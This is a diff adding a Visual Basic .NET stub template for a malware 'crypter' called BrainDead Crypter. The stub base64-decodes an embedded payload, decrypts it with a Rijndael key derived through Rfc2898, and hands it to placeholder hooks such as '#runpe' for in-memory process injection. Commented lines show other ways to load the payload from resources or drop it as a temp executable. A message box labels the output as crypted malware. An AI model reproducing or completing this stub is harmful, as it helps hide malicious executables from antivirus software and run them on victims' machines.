@@ -1,0 +1,77 @@
+﻿Imports Microsoft.VisualBasic.Strings
+Imports System.Threading
+Imports System.Reflection
+Imports System.Windows.Forms
+Imports System.Runtime.InteropServices
+Imports System.IO
+Imports System.Runtime.CompilerServices
+Imports System.Collections.Generic
+Imports System
+Imports System.Resources
+Imports System.Net.WebClient
+Imports System.Text
+Imports System.Diagnostics
+Imports System.IO.File
+Imports Microsoft.Win32
+Imports System.Security.Cryptography
+Imports Microsoft.VisualBasic
+Imports System.Diagnostics.Stopwatch
+
+
+Module Module1
+
+	'Private Declare Function FindResource Lib "kernel32" Alias "FindResourceA" (ByVal hModule As IntPtr, ByVal name As String, ByVal type As IntPtr) As IntPtr
+    'Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal moduleName As String) As IntPtr
+    'Private Declare Function SizeofResource Lib "kernel32" (ByVal hModule As IntPtr, ByVal hResInfo As IntPtr) As Integer
+    'Private Declare Function LoadResource Lib "kernel32" (ByVal hModule As IntPtr, ByVal hResInfo As IntPtr) As IntPtr
+    Dim ext as byte()
+	Sub Main()
+		Try
+		Dim %Value% = #Pack
+		ext = Convert.FromBase64String(%Value%)
+		'Dim man As New ResourceManager("my", Assembly.GetExecutingAssembly())
+		'Dim ext as byte() = DirectCast(man.GetObject("hash"), Byte())
+		'ext  = %ReadResource%(System.Windows.Forms.Application.ExecutablePath)
+		'Dim rcData As New IntPtr(10)
+        'Dim hModule As IntPtr = GetModuleHandle(Process.GetCurrentProcess.MainModule.ModuleName)
+        'Dim hRes As IntPtr = FindResource(hModule, "payload", rcData)
+        'Dim size As Integer = SizeofResource(hModule, hRes)
+        'Dim hGlob As IntPtr = LoadResource(hModule, hRes)
+        'Dim ext(size - 1) As Byte
+        'Marshal.Copy(hGlob, bytes, 0, bytes.Length)
+		Dim key as string = "{KEY}"
+		ext = Decrypt(ext, key)
+		'man.ReleaseAllResources()
+		'File.WriteAllBytes(Path.GetTempPath + "\jumbo.exe", ext)
+		Msgbox("The below file is malware crypted by BrainDead Crypter coded by PinguHash." + vbnewline + _
+		 System.Windows.Forms.Application.ExecutablePath, vbInformation, "BrainDead Crypter.")
+		Dim x as New Threading.Thread(AddressOf asd)
+		x.SetApartmentState(Threading.ApartmentState.STA)
+		x.start()
+		Catch ex as exception
+			msgbox(ex.tostring)
+		End Try
+		
+	End Sub
+	Public Sub asd()
+		#inside
+	End Sub
+
+	Public Function Decrypt(ByVal bytes As Byte(), ByVal Key As String) As Byte()
+        Dim rijndael__1 As Rijndael = Rijndael.Create()
+        Dim pdb As New Rfc2898DeriveBytes(Key, New Byte() {&H26, &HDC, &HFF, &H0, &HAD, &HED, _
+         &H7A, &HEE, &HC5, &HFE, &H7, &HAF, _
+         &H4D, &H8, &H22, &H3C})
+        rijndael__1.Key = pdb.GetBytes(32)
+        rijndael__1.IV = pdb.GetBytes(16)
+        Dim memoryStream As New MemoryStream()
+        Dim cryptoStream As New CryptoStream(memoryStream, rijndael__1.CreateDecryptor(), CryptoStreamMode.Write)
+        cryptoStream.Write(bytes, 0, bytes.Length)
+        cryptoStream.Close()
+        Return memoryStream.ToArray()
+    End Function
+
+	
+End Module
+
+#runpe
